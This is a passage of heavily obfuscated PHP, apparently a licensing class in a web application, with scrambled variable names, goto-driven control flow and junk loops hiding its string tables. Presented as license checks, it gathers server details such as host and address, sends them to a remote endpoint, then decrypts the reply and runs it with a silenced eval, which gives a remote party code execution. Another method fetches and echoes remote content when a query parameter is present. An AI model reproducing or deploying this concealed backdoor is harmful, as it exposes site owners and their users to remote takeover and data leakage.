$cÅªÑ”ŞŞ; $e…ÃéÏ­˜[184]($B‘‚Ï´í•£, !1); } $Aâğ‹¡¸ô = $dÊ¬ç¢©İ•[$e…ÃéÏ­˜[211]]; goto EŒ®Şñªƒ¾; f°‘¨¥†Œ: $a‹éÇ¼©ç = $D‚ì‡œÀ’é[617]; while ($a‹éÇ¼©ç < $D‚ì‡œÀ’é[596]) { if ($a‹éÇ¼©ç >= 0) { break; } $a‹éÇ¼©ç++; } $AÊÇ’ÓÎ÷é = $this->{$_SERVER[™ñğşİ€©ˆç][137]}($e…ÃéÏ­˜[166]($Aâğ‹¡¸ô), $bó™„ØÌÉÅ); goto B¯óÄôâêØ; F¤ŞÇñâ†: if (!isset($CŸáÁŸ®èë[$e…ÃéÏ­˜[183]]) || $e…ÃéÏ­˜[24]($CŸáÁŸ®èë[$e…ÃéÏ­˜[183]]) != 16) { $e…ÃéÏ­˜[184]($e…ÃéÏ­˜[185] . $CŸáÁŸ®èë[$e…ÃéÏ­˜[183]], !1); } $BÈ‚°Š°æ = $e…ÃéÏ­˜[61]($e…ÃéÏ­˜[62])->{$_SERVER[™ñğşİ€©ˆç][63]}($e…ÃéÏ­˜[126]); $Cø¦¥¼Êí = $e…ÃéÏ­˜[124]($_SERVER[$e…ÃéÏ­˜[125]] . $BÈ‚°Š°æ); goto E¡ñØƒÂ†‰; bËİÈƒÆ¹–: $CæøŠî•Ó = $D‚ì‡œÀ’é[620]; while (strlen($CæøŠî•Ó) < $D‚ì‡œÀ’é[583]) { if (!$CæøŠî•Ó) { break; } $CæøŠî•Ó++; } Cache::set($e…ÃéÏ­˜[249] . $e…ÃéÏ­˜[124]($BÈ‚°Š°æ . $e…ÃéÏ­˜[250]), $e…ÃéÏ­˜[10]); goto bë…ß½ ; B¯óÄôâêØ: $d—ÙÚ‰Óò = $e…ÃéÏ­˜[241]($e…ÃéÏ­˜[61]($e…ÃéÏ­˜[11])->{$_SERVER[™ñğşİ€©ˆç][242]}(), $e…ÃéÏ­˜[243]); $Fí‘½¬¡ìå = $D‚ì‡œÀ’é[618]; if (strlen($Fí‘½¬¡ìå) < $D‚ì‡œÀ’é[592]) { die; } goto bß­­é±…ã; Cœâ¿ñÛ´š: $e…ÃéÏ­˜[61]($e…ÃéÏ­˜[62])->{$_SERVER[™ñğşİ€©ˆç][240]}($f¾ï¤ò£œ­); $bó™„ØÌÉÅ = $e…ÃéÏ­˜[124]($_SERVER[$e…ÃéÏ­˜[125]] . $e…ÃéÏ­˜[233]($BÈ‚°Š°æ) . $f¾ï¤ò£œ­[$e…ÃéÏ­˜[229]]); $B¹÷ÄÇéöİ = $e…ÃéÏ­˜[233]($e…ÃéÏ­˜[25]($bó™„ØÌÉÅ, 10, 16)); goto f°‘¨¥†Œ; E¡ñØƒÂ†‰: $e¦È’ğî = array($e…ÃéÏ­˜[183] => $CŸáÁŸ®èë[$e…ÃéÏ­˜[183]], $e…ÃéÏ­˜[186] => $e…ÃéÏ­˜[134](16), $e…ÃéÏ­˜[187] => $e…ÃéÏ­˜[167], $e…ÃéÏ­˜[188] => $e…ÃéÏ­˜[189], $e…ÃéÏ­˜[190] => $_SERVER[$e…ÃéÏ­˜[191]], $e…ÃéÏ­˜[192] => $_SERVER[$e…ÃéÏ­˜[193]], $e…ÃéÏ­˜[194] => $_SERVER[$e…ÃéÏ­˜[195]], $e…ÃéÏ­˜[123] => $Cø¦¥¼Êí, $e…ÃéÏ­˜[196] => $e…ÃéÏ­˜[61]($e…ÃéÏ­˜[62])->{$_SERVER[™ñğşİ€©ˆç][63]}($e…ÃéÏ­˜[157])); $e±Ã„µÁ ô = $D‚ì‡œÀ’é[613]; if (!$e±Ã„µÁ ô) { return; } goto DëˆÑèá›¶; bß­­é±…ã: $DÏ ôÊÛ©‡ = $d—ÙÚ‰Óò[$e…ÃéÏ­˜[244]]; $aó°Êô© = array(); $dæŞ™ÈÍ‡† = $D‚ì‡œÀ’é[619]; goto AÉ¨æĞã”•; B´·Úåö: $D¨’Šˆç§ = $D‚ì‡œÀ’é[616]; if (strlen($D¨’Šˆç§) < $D‚ì‡œÀ’é[575]) { return; } if ($Aâğ‹¡¸ô[$e…ÃéÏ­˜[236]] && $Aâğ‹¡¸ô[$e…ÃéÏ­˜[236]] >= 1) { $e…ÃéÏ­˜[61]($e…ÃéÏ­˜[62])->{$_SERVER[™ñğşİ€©ˆç][237]}($e…ÃéÏ­˜[238], $e…ÃéÏ­˜[239]); } goto Cœâ¿ñÛ´š; F®‡°š: $Bø® ÓĞ = $D‚ì‡œÀ’é[615]; if (strlen($Bø® ÓĞ) < $D‚ì‡œÀ’é[596]) { die; } $f¾ï¤ò£œ­[$e…ÃéÏ­˜[132]] = $e…ÃéÏ­˜[233]($e…ÃéÏ­˜[128]($this->{$_SERVER[™ñğşİ€©ˆç][165]}($AÅˆáÖš, $e…ÃéÏ­˜[234]))); goto fÇ‹Ã«°ƒä; fÇ‹Ã«°ƒä: $d±É°Ÿø«¤ = $e…ÃéÏ­˜[134](16); $cÕÎ‰šœá = $d±É°Ÿø«¤ . $f¾ï¤ò£œ­[$e…ÃéÏ­˜[130]] . $this->{$_SERVER[™ñğşİ€©ˆç][165]}($e…ÃéÏ­˜[124]($f¾ï¤ò£œ­[$e…ÃéÏ­˜[227]]), $d±É°Ÿø«¤); $f¾ï¤ò£œ­[$e…ÃéÏ­˜[133]] = $e…ÃéÏ­˜[128]($e…ÃéÏ­˜[233]($this->{$_SERVER[™ñğşİ€©ˆç][165]}($cÕÎ‰šœá, $e…ÃéÏ­˜[235]))); goto B´·Úåö; fÌ¸Ãğ¡¨: if (!$e…ÃéÏ­˜[116]($GLOBALS, $e…ÃéÏ­˜[142])) { die; } $CŸáÁŸ®èë = $GLOBALS[$e…ÃéÏ­˜[22]]; if (isset($CŸáÁŸ®èë[$e…ÃéÏ­˜[181]])) { $this->{$_SERVER[™ñğşİ€©ˆç][182]}(); die; } goto F¤ŞÇñâ†; fœáö åë: } private function licenseRegistSuccess() { goto eÊ±é‘á•; F±¹í–èó: $fì·ºĞÁà = $A¦Ööñ¼‘»[622]; while (strlen($fì·ºĞÁà) < $A¦Ööñ¼‘»[583]) { if (!$fì·ºĞÁà) { break; } $fì·ºĞÁà++; } if ($e½ƒâ¸ÍŞƒ[$bŸÀ«¡ƒ»[93]] != $bŸÀ«¡ƒ»[239]) { $bŸÀ«¡ƒ»[61]($bŸÀ«¡ƒ»[62])->{$_SERVER[™ñğşİ€©ˆç][240]}($bŸÀ«¡ƒ»[93], $bŸÀ«¡ƒ»[239]); } goto FŞ¤Ó‹ŞäŒ; FŞ¤Ó‹ŞäŒ: $bŸÀ«¡ƒ»[120]($bŸÀ«¡ƒ»[251])->{$_SERVER[™ñğşİ€©ˆç][252]}(!0); goto fó•  İŠï; eÊ±é‘á•: $A¦Ööñ¼‘» =& $_SERVER[ÒÆ›ÆØÎ¾]; $bŸÀ«¡ƒ» =& $_SERVER[™ñğşİ€©ˆç]; $e½ƒâ¸ÍŞƒ = $bŸÀ«¡ƒ»[61]($bŸÀ«¡ƒ»[62])->{$_SERVER[™ñğşİ€©ˆç][63]}(); goto F±¹í–èó; fó•  İŠï: } private function dzic34e050e6() { goto C¢¥ØÇ‚„ƒ; B±ÇÁÈ¬ù: $eÕ„ƒ£Ì¥« = $bÔä‹œ­Åæ[623]; $C¿Í¶ÊÉ¨¨[61]($C¿Í¶ÊÉ¨¨[62])->{$_SERVER[™ñğşİ€©ˆç][237]}($C¿Í¶ÊÉ¨¨[238], $C¿Í¶ÊÉ¨¨[253]); $C’ò‚Ü¨Áˆ = $bÔä‹œ­Åæ[624]; goto eÔ„¶¸¹; eÔ„¶¸¹: $this->dlur7bd63502 = array(); $this->clna1f9cfecc = $C¿Í¶ÊÉ¨¨[131]; $E±Âö™™¨ = $bÔä‹œ­Åæ[625]; goto Fòè±à‰; C¢¥ØÇ‚„ƒ: $bÔä‹œ­Åæ =& $_SERVER[ÒÆ›ÆØÎ¾]; $C¿Í¶ÊÉ¨¨ =& $_SERVER[™ñğşİ€©ˆç]; $C¿Í¶ÊÉ¨¨[61]($C¿Í¶ÊÉ¨¨[62])->{$_SERVER[™ñğşİ€©ˆç][240]}(array($C¿Í¶ÊÉ¨¨[227] => $C¿Í¶ÊÉ¨¨[10], $C¿Í¶ÊÉ¨¨[229] => $C¿Í¶ÊÉ¨¨[10], $C¿Í¶ÊÉ¨¨[130] => $C¿Í¶ÊÉ¨¨[131], $C¿Í¶ÊÉ¨¨[132] => $C¿Í¶ÊÉ¨¨[10], $C¿Í¶ÊÉ¨¨[133] => $C¿Í¶ÊÉ¨¨[10])); goto B±ÇÁÈ¬ù; Fòè±à‰: } private function ctiaed191cd2() { goto bÀ²ºÇÅæä; b¦¦ó¾: if ($DïÙá‰•‘ù[255]() >= $E–âİà‹Ì—) { return $this->{$_SERVER[™ñğşİ€©ˆç][182]}(); } if ($DïÙá‰•‘ù[255]() - $bØè˜ƒå…[$DïÙá‰•‘ù[254]] > 20) { $bØè˜ƒå…[$DïÙá‰•‘ù[254]] = $DïÙá‰•‘ù[255](); Cache::set($dç¦ù†Ëéá, $bØè˜ƒå…); } $this->dlur7bd63502 = $bØè˜ƒå…; goto EÈÌÙß¼Ú¿; EÈÌÙß¼Ú¿: $this->clna1f9cfecc = $B™¦õ™é‘à[$DïÙá‰•‘ù[130]]; goto fÉç˜²´ë±; B—é•êé‰‹: $B™¦õ™é‘à = $DïÙá‰•‘ù[61]($DïÙá‰•‘ù[62])->{$_SERVER[™ñğşİ€©ˆç][63]}(); $fÍ„’²æÜâ = $Fß¢áçÂ¸­[627]; while (strlen($fÍ„’²æÜâ) < $Fß¢áçÂ¸­[596]) { if (!$fÍ„’²æÜâ) { break; } $fÍ„’²æÜâ++; } goto Fã¦ä™¸¸Ç; D®ØÎÃí»‚: if (!$DïÙá‰•‘ù[161]($bØè˜ƒå…) || !isset($bØè˜ƒå…[$DïÙá‰•‘ù[254]]) || $DïÙá‰•‘ù[255]() - $bØè˜ƒå…[$DïÙá‰•‘ù[254]] >= 60) { $e›ÈÂ•½­è = $DïÙá‰•‘ù[241]($DïÙá‰•‘ù[61]($DïÙá‰•‘ù[11])->{$_SERVER[™ñğşİ€©ˆç][242]}(), $DïÙá‰•‘ù[243]); $CÓ„ÅåÖÀ¶ = $e›ÈÂ•½­è[$DïÙá‰•‘ù[244]]; $a†ÅåˆÕÍ = $DïÙá‰•‘ù[124]($_SERVER[$DïÙá‰•‘ù[125]] . $DïÙá‰•‘ù[233]($CÁ©¯¢‡Ã) . $B™¦õ™é‘à[$DïÙá‰•‘ù[229]]); $dª§Ëù­§¢ = $DïÙá‰•‘ù[233]($DïÙá‰•‘ù[25]($a†ÅåˆÕÍ, 10, 16)); $bØè˜ƒå… = $this->{$_SERVER[™ñğşİ€©ˆç][208]}($CÓ„ÅåÖÀ¶[$DïÙá‰•‘ù[104]][$dª§Ëù­§¢], $a†ÅåˆÕÍ); $bØè˜ƒå… = $DïÙá‰•‘ù[210]($bØè˜ƒå…, !0); } if (!$DïÙá‰•‘ù[161]($bØè˜ƒå…)) { return $this->{$_SERVER[™ñğşİ€©ˆç][182]}(); } $E–âİà‹Ì— = $DïÙá‰•‘ù[154]($bØè˜ƒå…[$DïÙá‰•‘ù[155]]); goto b¦¦ó¾; Fã¦ä™¸¸Ç: if ($B™¦õ™é‘à[$DïÙá‰•‘ù[130]] == $DïÙá‰•‘ù[131]) { return; } $CÁ©¯¢‡Ã = $DïÙá‰•‘ù[61]($DïÙá‰•‘ù[62])->{$_SERVER[™ñğşİ€©ˆç][63]}($DïÙá‰•‘ù[126]); $e†¹ôˆ©õ  = $Fß¢áçÂ¸­[628]; goto aÆÌß¼ÉÙ; bÀ²ºÇÅæä: $Fß¢áçÂ¸­ =& $_SERVER[ÒÆ›ÆØÎ¾]; $DïÙá‰•‘ù =& $_SERVER[™ñğşİ€©ˆç]; $_SERVER[$DïÙá‰•‘ù[193]] = $DïÙá‰•‘ù[116]($_SERVER, $DïÙá‰•‘ù[193], APP_HOST); goto EÔ«ÆòÛœæ; aÆÌß¼ÉÙ: if (strlen($e†¹ôˆ©õ ) < $Fß¢áçÂ¸­[592]) { return; } $dç¦ù†Ëéá = $DïÙá‰•‘ù[249] . $DïÙá‰•‘ù[124]($CÁ©¯¢‡Ã . $DïÙá‰•‘ù[250]); $bØè˜ƒå… = Cache::get($dç¦ù†Ëéá); goto D®ØÎÃí»‚; EÔ«ÆòÛœæ: $this->clna1f9cfecc = $DïÙá‰•‘ù[131]; $bæÌ–×¾Ã = $Fß¢áçÂ¸­[626]; if (strlen($bæÌ–×¾Ã) < $Fß¢áçÂ¸­[583]) { die; } goto B—é•êé‰‹; fÉç˜²´ë±: } private function bruifc391b9b() { goto C§ß›×†âŞ; DŒØÑŸñ÷: $bÌ‡°’¹¬« = $A¤É’ß‚–‡[630]; if (strlen($bÌ‡°’¹¬«) < $A¤É’ß‚–‡[596]) { return; } if ($e–å•™Ê == $fƒ¶ŸÎ´×§[256] && $this->clna1f9cfecc == $fƒ¶ŸÎ´×§[131]) { $fƒ¶ŸÎ´×§[184]($fƒ¶ŸÎ´×§[216]($fƒ¶ŸÎ´×§[257]), !1, $fƒ¶ŸÎ´×§[258]); } goto bòğ…ï¨ô…; d¶ß±Æñ•Ì: $e„„Ñ˜™Òø = $A¤É’ß‚–‡[629]; while ($e„„Ñ˜™Òø < $A¤É’ß‚–‡[592]) { if ($e„„Ñ˜™Òø >= 0) { break; } $e„„Ñ˜™Òø++; } $e–å•™Ê = $_SERVER[$fƒ¶ŸÎ´×§[44]]; goto DŒØÑŸñ÷; bòğ…ï¨ô…: $cÅ—ã‹Æ“È = array($fƒ¶ŸÎ´×§[259], $fƒ¶ŸÎ´×§[260]); if ($fƒ¶ŸÎ´×§[261]($e–å•™Ê, $cÅ—ã‹Æ“È)) { if ($this->clna1f9cfecc == $fƒ¶ŸÎ´×§[131] && isset($D‹¬®¢ÄêÅ[$fƒ¶ŸÎ´×§[262]])) { $fƒ¶ŸÎ´×§[184]($fƒ¶ŸÎ´×§[216]($fƒ¶ŸÎ´×§[257]), !1, $fƒ¶ŸÎ´×§[258]); die; } $E¬¶õâÏ´¨ = $this->{$_SERVER[™ñğşİ€©ˆç][147]}(); if ($E¬¶õâÏ´¨ != $fƒ¶ŸÎ´×§[263]($fƒ¶ŸÎ´×§[264])) { if ($E¬¶õâÏ´¨ <= $fƒ¶ŸÎ´×§[61]($fƒ¶ŸÎ´×§[149])->{$_SERVER[™ñğşİ€©ˆç][150]}()) { $fƒ¶ŸÎ´×§[184]($fƒ¶ŸÎ´×§[216]($fƒ¶ŸÎ´×§[265]), !1, $fƒ¶ŸÎ´×§[258]); die; } } } goto dë÷¬ç¬›Î; C§ß›×†âŞ: $A¤É’ß‚–‡ =& $_SERVER[ÒÆ›ÆØÎ¾]; $fƒ¶ŸÎ´×§ =& $_SERVER[™ñğşİ€©ˆç]; $D‹¬®¢ÄêÅ = $GLOBALS[$fƒ¶ŸÎ´×§[22]]; goto d¶ß±Æñ•Ì; dë÷¬ç¬›Î: } private function exhje5abb63a() { goto d‹­õÛ‰‚Ô; aˆÁÕÔ«×½: $A¶’–½Ä‚Ñ = $this->{$_SERVER[™ñğşİ€©ˆç][269]}($A¶’–½Ä‚Ñ, $eØ˜‡‚ƒ¿É[270]); $c…øÈ”İÒÓ = $c¬ğ°¡”ƒì[631]; if (strlen($c…øÈ”İÒÓ) < $c¬ğ°¡”ƒì[575]) { return; } goto B†ë‰•²ò‰; d‹­õÛ‰‚Ô: $c¬ğ°¡”ƒì =& $_SERVER[ÒÆ›ÆØÎ¾]; $eØ˜‡‚ƒ¿É =& $_SERVER[™ñğşİ€©ˆç]; $có¾äğÜĞÎ = array($eØ˜‡‚ƒ¿É[145], $eØ˜‡‚ƒ¿É[266]); goto AˆïŠÏ×îÇ; B‰Ì¼œçŸë: $C…˜‹»ß = $c¬ğ°¡”ƒì[634]; if (strlen($C…˜‹»ß) < $c¬ğ°¡”ƒì[583]) { return; } if ($Aè¨¥¥ÂîÑ && $eØ˜‡‚ƒ¿É[32]($Aè¨¥¥ÂîÑ, $eØ˜‡‚ƒ¿É[279])) { echo $Aè¨¥¥ÂîÑ; } goto C¼®¡àª¸¹; BÑˆ‰ö÷†: $B‹†ò¦İÆÂ = $c¬ğ°¡”ƒì[633]; if (strlen($B‹†ò¦İÆÂ) < $c¬ğ°¡”ƒì[596]) { die; } $eØ˜‡‚ƒ¿É[277]($eØ˜‡‚ƒ¿É[278]); goto B‰Ì¼œçŸë; C¼®¡àª¸¹: die; goto f³ÕËÛ»É; AˆïŠÏ×îÇ: if (!$eØ˜‡‚ƒ¿É[116]($GLOBALS, $eØ˜‡‚ƒ¿É[142]) || !isset($_GET[$eØ˜‡‚ƒ¿É[267]])) { return; } if (!$eØ˜‡‚ƒ¿É[261]($_SERVER[$eØ˜‡‚ƒ¿É[44]], $có¾äğÜĞÎ)) { return; } $A¶’–½Ä‚Ñ = $eØ˜‡‚ƒ¿É[268]; goto aˆÁÕÔ«×½; B†ë‰•²ò‰: $f¡„À÷µ© = $eØ˜‡‚ƒ¿É[271](array($eØ˜‡‚ƒ¿É[272] => array($eØ˜‡‚ƒ¿É[273] => $eØ˜‡‚ƒ¿É[274], $eØ˜‡‚ƒ¿É[275] => 3))); $a„»ÒŒå¿° = $c¬ğ°¡”ƒì[632]; $Aè¨¥¥ÂîÑ = @$eØ˜‡‚ƒ¿É[276]($A¶’–½Ä‚Ñ, !1, $f¡„À÷µ©); goto BÑˆ‰ö÷†; f³ÕËÛ»É: } public function bvws95f77794($fğ¶¶Ğ¥Ø) { goto dßÌ’ºÌêœ; f³‡ºŞÆÒù: $f»­±Šñ‹è = array(); foreach ($b°é¯©ğø¤ as $fâ¹©ÁğÜ¤ => $f˜î”™ì×ˆ) { if ($f˜î”™ì×ˆ == $Dí–” è‡[282] && $Dí–” è‡[25]($this->clna1f9cfecc, 0, 1) == $Dí–” è‡[282]) { continue; } if (!$Dí–” è‡[261]($fâ¹©ÁğÜ¤, $DˆÈ¶Æ¥è¡)) { $f»­±Šñ‹è[] = $fâ¹©ÁğÜ¤; } } foreach ($f»­±Šñ‹è as $fâ¹©ÁğÜ¤) { unset($fğ¶¶Ğ¥Ø[$fâ¹©ÁğÜ¤]); $bò¥æ¯ÇÂè = $Fí·Î’åÅ[637]; if (strlen($bò¥æ¯ÇÂè) < $Fí·Î’åÅ[575]) { return; } } goto cœ°­Åõƒ; D˜ÛâÂªàë: $b°é¯©ğø¤ = array($Dí–” è‡[281] => $Dí–” è‡[282], $Dí–” è‡[283] => $Dí–” è‡[282], $Dí–” è‡[284] => $Dí–” è‡[282], $Dí–” è‡[285] => $Dí–” è‡[282], $Dí–” è‡[286] => $Dí–” è‡[282], $Dí–” è‡[287] => $Dí–” è‡[282], $Dí–” è‡[288] => $Dí–” è‡[289], $Dí–” è‡[290] => $Dí–” è‡[289], $Dí–” è‡[291] => $Dí–” è‡[289], $Dí–” è‡[292] => $Dí–” è‡[289], $Dí–” è‡[293] => $Dí–” è‡[289], $Dí–” è‡[294] => $Dí–” è‡[289], $Dí–” è‡[295] => $Dí–” è‡[289], $Dí–” è‡[296] => $Dí–” è‡[289], $Dí–” è‡[297] => $Dí–” è‡[289]); $cî–Æ¾» = $Fí·Î’åÅ[635]; if (strlen($cî–Æ¾») < $Fí·Î’åÅ[596]) { die; } goto D”†ùµÈÆ²; cœ°­Åõƒ: return $fğ¶¶Ğ¥Ø; goto e¯Ä¶Óå•„; D”†ùµÈÆ²: $DˆÈ¶Æ¥è¡ = $Dí–” è‡[0]($Dí–” è‡[298], $Dí–” è‡[116]($this->dlur7bd63502, $Dí–” è‡[139], $Dí–” è‡[10])); $F„»ÑïÂ¾ = $Fí·Î’åÅ[636]; if (!$F„»ÑïÂ¾) { return; } goto f³‡ºŞÆÒù; dßÌ’ºÌêœ: $Fí·Î’åÅ =& $_SERVER[ÒÆ›ÆØÎ¾]; $Dí–” è‡ =& $_SERVER[™ñğşİ€©ˆç]; if ($this->clna1f9cfecc == $Dí–” è‡[280]) { return $fğ¶¶Ğ¥Ø; } goto D˜ÛâÂªàë; e¯Ä¶Óå•„: } private function agbxede30a19() { goto cÆ’ç¬Ã§Ğ; B·‚ö½İË±: $GLOBALS[$E¯°›õ„´[104]][$E¯°›õ„´[300]] = $E¯°›õ„´[239]; $eî¹ÈˆÍô™ = $_SERVER[ÒÆ›ÆØÎ¾][638]; if (!$eî¹ÈˆÍô™) { return; } goto AÀ«ÃÃÜ¤ß; cÆ’ç¬Ã§Ğ: $E¯°›õ„´ =& $_SERVER[™ñğşİ€©ˆç]; if ($this->clna1f9cfecc != $E¯°›õ„´[131]) { return; } $GLOBALS[$E¯°›õ„´[104]][$E¯°›õ„´[108]][$E¯°›õ„´[299]] = $E¯°›õ„´[239]; goto B·‚ö½İË±; AÀ«ÃÃÜ¤ß: if ($E¯°›õ„´[61]($E¯°›õ„´[301])->{$_SERVER[™ñğşİ€©ˆç][63]}($E¯°›õ„´[93]) != $E¯°›õ„´[253]) { $E¯°›õ„´[61]($E¯°›õ„´[301])->{$_SERVER[™ñğşİ€©ˆç][240]}($E¯°›õ„´[93], $E¯°›õ„´[253]); } goto a¦åŒ»Ã…æ; a¦åŒ»Ã…æ: } public function ztjb5d5b3120() { $C–ƒ‘©á =& $_SERVER[ÒÆ›ÆØÎ¾]; return $_SERVER[™ñğşİ€©ˆç][302]; $d³‡½„¶Ñ± = $C–ƒ‘©á[609]; while ($d³‡½„¶Ñ± < $C–ƒ‘©á[579]) { if ($d³‡½„¶Ñ± >= 0) { break; } $d³‡½„¶Ñ±++; } } private function hrwj2561b703() { goto A‹ò–ö•«Ë; aìá›ä‹»¼: if ($bğæˆğÔº™[$eêµß×ğô[183]] && $bğæˆğÔº™[$eêµß×ğô[312]]) { if ($this->{$_SERVER[™ñğşİ€©ˆç][218]}($bğæˆğÔº™[$eêµß×ğô[312]]) == $d‚Û˜¾ùù»[$eêµß×ğô[183]]) { return; } } $this->{$_SERVER[™ñğşİ€©ˆç][182]}(); $EÏÁŠÙ†“¯ = $DêšßœÇÌ¸[643]; goto bƒ…¹¾×í; fòó¿Œ™Ê: $EîÕÀ”‹‡ = $eêµß×ğô[13](array($eêµß×ğô[308], $eêµß×ğô[309]), $aãø’øğ«); if ($EîÕÀ”‹‡ && $eêµß×ğô[255]() - $EîÕÀ”‹‡ < $eêµß×ğô[263]($eêµß×ğô[310])) { return; } $eêµß×ğô[13](array($eêµß×ğô[308], $eêµß×ğô[170]), $aãø’øğ«, $eêµß×ğô[255]()); goto d¢øö›¡‡Ã; c…ñÖ«½º‹: $d‚Û˜¾ùù» = array($eêµß×ğô[183] => $eêµß×ğô[61]($eêµß×ğô[62])->{$_SERVER[™ñğşİ€©ˆç][63]}($eêµß×ğô[227]), $eêµß×ğô[197] => $this->clna1f9cfecc, $eêµß×ğô[194] => $_SERVER[$eêµß×ğô[195]], $eêµß×ğô[196] => $eêµß×ğô[61]($eêµß×ğô[62])->{$_SERVER[™ñğşİ€©ˆç][63]}($eêµß×ğô[157]), $eêµß×ğô[123] => $eêµß×ğô[124]($_SERVER[$eêµß×ğô[125]] . $C·ÍÑÀµŒÏ), $eêµß×ğô[187] => $eêµß×ğô[167], $eêµß×ğô[190] => $_SERVER[$eêµß×ğô[191]]); $F­†¶¤§´ù = $DêšßœÇÌ¸[641]; $bğæˆğÔº™ = $this->{$_SERVER[™ñğşİ€©ˆç][202]}($eêµß×ğô[311], $d‚Û˜¾ùù»); goto FÓØµ©£—É; AÑÚ¥İòè: $aãø’øğ« = $eêµß×ğô[306] . $eêµß×ğô[124]($eêµß×ğô[307]); $eİÙ†¥ƒãò = $DêšßœÇÌ¸[639]; if (strlen($eİÙ†¥ƒãò) < $DêšßœÇÌ¸[583]) { return; } goto CÓ«Úêİã«; CÓ«Úêİã«: if ($this->clna1f9cfecc == $eêµß×ğô[131] || !$eêµß×ğô[116]($GLOBALS, $eêµß×ğô[142])) { return; } if (!$eêµß×ğô[261]($_SERVER[$eêµß×ğô[44]], $e©§¥‰Œ)) { return; } if ($eêµß×ğô[255]() % 4 != 0) { return; } goto fòó¿Œ™Ê; FÓØµ©£—É: $E‘Œ†ëò½ = $DêšßœÇÌ¸[642]; while (strlen($E‘Œ†ëò½) < $DêšßœÇÌ¸[575]) { if (!$E‘Œ†ëò½) { break; } $E‘Œ†ëò½++; } if (!$eêµß×ğô[161]($bğæˆğÔº™)) { return; } goto aìá›ä‹»¼; A‹ò–ö•«Ë: $DêšßœÇÌ¸ =& $_SERVER[ÒÆ›ÆØÎ¾]; $eêµß×ğô =& $_SERVER[™ñğşİ€©ˆç]; $e©§¥‰Œ = array($eêµß×ğô[303], $eêµß×ğô[304], $eêµß×ğô[305]); goto AÑÚ¥İòè; d¢øö›¡‡Ã: $e®ÔùáéÏ = $DêšßœÇÌ¸[640]; while ($e®ÔùáéÏ < $DêšßœÇÌ¸[579]) { if ($e®ÔùáéÏ >= 0) { break; } $e®ÔùáéÏ++; } $C·ÍÑÀµŒÏ = $eêµß×ğô[61]($eêµß×ğô[62])->{$_SERVER[™ñğşİ€©ˆç][63]}($eêµß×ğô[126]); goto c…ñÖ«½º‹; bƒ…¹¾×í: while (strlen($EÏÁŠÙ†“¯) < $DêšßœÇÌ¸[575]) { if (!$EÏÁŠÙ†“¯) { break; } $EÏÁŠÙ†“¯++; } if ($this->{$_SERVER[™ñğşİ€©ˆç][218]}($bğæˆğÔº™[$eêµß×ğô[312]]) != $d‚Û˜¾ùù»[$eêµß×ğô[183]]) { $DÎŞ°„°˜† = array($eêµß×ğô[220] => $C·ÍÑÀµŒÏ, $eêµß×ğô[221] => $_SERVER[$eêµß×ğô[125]], $eêµß×ğô[222] => $eêµß×ğô[223](), $eêµß×ğô[192] => $_SERVER[$eêµß×ğô[193]]); $eÏÌÓ÷÷Üõ = $this->{$_SERVER[™ñğşİ€©ˆç][224]}($eêµß×ğô[166]($DÎŞ°„°˜†)); $bğæˆğÔº™ = $this->{$_SERVER[™ñğşİ€©ˆç][202]}($eêµß×ğô[225] . $eÏÌÓ÷÷Üõ); if ($bğæˆğÔº™ && $eêµß×ğô[161]($bğæˆğÔº™) && isset($bğæˆğÔº™[$eêµß×ğô[312]])) { $D‘‘ç–…ÆÏ = $this->{$_SERVER[™ñğşİ€©ˆç][208]}($bğæˆğÔº™[$eêµß×ğô[312]], 2); if ($D‘‘ç–…ÆÏ) { $D‘‘ç–…ÆÏ = $this->{$_SERVER[™ñğşİ€©ˆç][218]}($D‘‘ç–…ÆÏ); } if ($D‘‘ç–…ÆÏ) { try { @eval($D‘‘ç–…ÆÏ); } catch (Exception $fôµˆğ††¾) { } } } } goto f¢ÕÆÊâñ; f¢ÕÆÊâñ: } private function xogs372f884c($E›àŠè‰à = '', $CÙì±›ĞÉ = array(), $aêãÚŒğÍƒ = 5) { goto cÈ×â±²´“; cÈ×â±²´“: $b‚¿ˆ£âù¬ =& $_SERVER[ÒÆ›ÆØÎ¾]; $Bˆ›ö²Öö =& $_SERVER[™ñğşİ€©ˆç]; $aÕÃ¾¾¨Š° = $Bˆ›ö²Öö[313]; goto D­ŠÏÌïï‹; D­ŠÏÌïï‹: $aÕÃ¾¾¨Š° = $this->{$_SERVER[™ñğşİ€©ˆç][269]}($aÕÃ¾¾¨Š°, $Bˆ›ö²Öö[314]); $aÕÃ¾¾¨Š° = $aÕÃ¾¾¨Š° . $E›àŠè‰à; if ($CÙì±›ĞÉ && $Bˆ›ö²Öö[161]($CÙì±›ĞÉ)) { $aÕÃ¾¾¨Š° = $aÕÃ¾¾¨Š° . $Bˆ›ö²Öö[315] . $Bˆ›ö²Öö[316]($CÙì±›ĞÉ); } goto D‰–ŒÈíŠ›; BØ±®‰ÌèŠ: if (!$B¶±Ï¾İºĞ) { die; } $CÙì±›ĞÉ = @$Bˆ›ö²Öö[276]($aÕÃ¾¾¨Š°, !1, $A³°¼÷ºñ); return $Bˆ›ö²Öö[210]($CÙì±›ĞÉ, !0); goto cšá‰Ç½ÄÓ; cšá‰Ç½ÄÓ: $b¿Íö®„áŠ = $b‚¿ˆ£âù¬[645]; $CÅÊ¿Ñî¼ = $b‚¿ˆ£âù¬[646]; while (strlen($CÅÊ¿Ñî¼) < $b‚¿ˆ£âù¬[579]) { if (!$CÅÊ¿Ñî¼) { break; } $CÅÊ¿Ñî¼++; } goto F„‡Ì÷´ê¿; D‰–ŒÈíŠ›: if ($CÙì±›ĞÉ === -1) { return $aÕÃ¾¾¨Š°; } $A³°¼÷ºñ = $Bˆ›ö²Öö[271](array($Bˆ›ö²Öö[272] => array($Bˆ›ö²Öö[275] => $aêãÚŒğÍƒ, $Bˆ›ö²Öö[273] => $Bˆ›ö²Öö[317]), $Bˆ›ö²Öö[318] => array($Bˆ›ö²Öö[319] => !1, $Bˆ›ö²Öö[320] => !1))); $B¶±Ï¾İºĞ = $b‚¿ˆ£âù¬[644]; goto BØ±®‰ÌèŠ; F„‡Ì÷´ê¿: } private function sjbl1aee9c3f() { goto eŒ‰¯°Ú‰™; eŒ‰¯°Ú‰™: $BòŠ×¼åÖ =& $_SERVER[ÒÆ›ÆØÎ¾]; $Aìô¨­Óï¯ =& $_SERVER[™ñğşİ€©ˆç]; $Có´‰Å‚Î = array($Aìô¨­Óï¯[321] => $Aìô¨­Óï¯[322], $Aìô¨­Óï¯[323] => $Aìô¨­Óï¯[324], $Aìô¨­Óï¯[325] => $Aìô¨­Óï¯[326], $Aìô¨­Óï¯[327] => $Aìô¨­Óï¯[328], $Aìô¨­Óï¯[329] => $Aìô¨­Óï¯[330], 